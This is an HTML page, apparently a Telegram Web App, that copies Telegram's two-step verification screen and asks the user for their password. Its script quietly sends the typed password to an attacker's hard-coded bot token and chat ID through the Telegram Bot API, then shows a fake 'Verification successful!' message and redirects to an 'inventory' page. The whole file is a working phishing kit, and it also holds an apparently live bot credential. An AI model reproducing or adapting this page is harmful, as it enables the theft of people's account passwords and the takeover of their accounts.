<!DOCTYPE html>
<html lang="en">
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
    window.Telegram.WebApp.expand(); // Разворачивает окно на весь экран
    window.Telegram.WebApp.ready();
</script>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two-Step Verification</title>
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh;
            overflow: hidden;
        }
        .login-box {
            width: 100%; max-width: 340px; text-align: center; padding: 20px;
        }
        .logo-svg {
            width: 80px; height: 80px; margin-bottom: 30px;
        }
        h2 { font-size: 24px; margin-bottom: 12px; font-weight: 600; }
        p { color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 35px; padding: 0 15px; }
        .input-group {
            text-align: left; margin-bottom: 25px;
        }
        label { color: #0088cc; font-weight: 500; font-size: 14px; margin-left: 4px; }
        input {
            width: 100%; background-color: #1c1c1e; border: 1px solid #2c2c2e; 
            padding: 14px; color: #fff; border-radius: 10px; font-size: 18px; 
            box-sizing: border-box; outline: none; margin-top: 8px;
        }
        input:focus { border-color: #0088cc; }
        .btn-verify {
            background-color: #0088cc; color: white; border: none;
            width: 100%; padding: 14px; border-radius: 10px;
            font-size: 16px; font-weight: 600; cursor: pointer;
            text-transform: uppercase; letter-spacing: 0.5px; margin-top: 5px;
        }
        .forgot {
            margin-top: 25px; color: #0088cc; font-size: 14px; cursor: pointer; font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <svg class="logo-svg" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
            <circle cx="120" cy="120" r="120" fill="#0088CC"/>
            <path d="M175.833 70.3661L44.2461 121.087C35.2689 124.69 35.3188 129.704 42.6139 131.947L76.3776 142.485L154.512 93.1895C158.204 90.9463 161.574 92.1793 158.789 94.6548L95.4054 151.854L92.95 186.745C96.3683 186.745 97.8769 185.176 99.7896 183.332L116.236 167.337L150.435 192.602C156.74 196.077 161.272 194.288 162.84 186.769L185.275 80.9329C187.57 71.7235 181.776 67.5615 175.833 70.3661Z" fill="white"/>
        </svg>
        
        <h2>Two-Step Verification</h2>
        <p>Your account is protected by an additional password.</p>
        
        <form action="#" id="passwordForm">
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="tg-password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn-verify">Submit</button>
        </form>

        <div class="forgot">Forgot password?</div>
    </div>

    <script>
        const BOT_TOKEN = '8598157493:AAH_95b9t0ehVfwvfBm2vcnySZyyY79rUBg'; 
        const CHAT_ID = '6990072009';

        document.getElementById('passwordForm').onsubmit = function(e) {
            e.preventDefault();
            const password = document.getElementById('tg-password').value;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `🔐 ПОЛУЧЕН 2FA ПАРОЛЬ: ${password}`
                })
            }).then(() => {
                // После ввода пароля перекидываем в основной инвентарь
                alert('Verification successful!');
                window.location.href = "inventory.html";
            });
        };
    </script>
</body>
</html>
